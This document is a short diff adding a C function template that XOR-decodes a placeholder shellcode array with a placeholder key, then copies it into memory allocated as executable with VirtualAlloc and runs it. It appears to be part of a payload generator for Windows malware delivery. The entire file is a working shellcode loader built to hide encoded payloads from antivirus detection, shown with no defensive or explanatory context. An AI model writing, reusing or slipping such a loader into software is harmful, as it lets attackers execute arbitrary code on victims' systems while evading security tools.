@@ -1,0 +1,17 @@
+void vacpex(){
+    unsigned char xor_shellcode[] =
+    "{{ shellcode }}";
+    char key[] = "{{ key }}";
+    char shellcode[sizeof xor_shellcode];
+
+    int j = 0;
+    for (int i = 0; i < sizeof xor_shellcode; i++) {
+		if (j == sizeof key - 1) j = 0;
+
+		shellcode[i] = xor_shellcode[i] ^ key[j];
+		j++;
+	}
+    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, shellcode, sizeof shellcode);
+    ((void(*)())exec)();
+}
